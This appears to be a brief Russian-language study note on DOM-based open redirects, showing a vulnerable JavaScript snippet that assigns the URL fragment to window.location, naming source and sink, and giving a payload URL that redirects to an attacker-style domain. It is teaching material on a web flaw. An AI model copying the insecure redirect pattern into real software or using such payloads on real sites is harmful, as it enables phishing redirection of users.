# DOM-based open redirect

Есть js:

```javascript
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

source = location.hash\
sink = window.location

payload:

```
https://www.innocent-website.com/example#https://www.evil-user.net
```
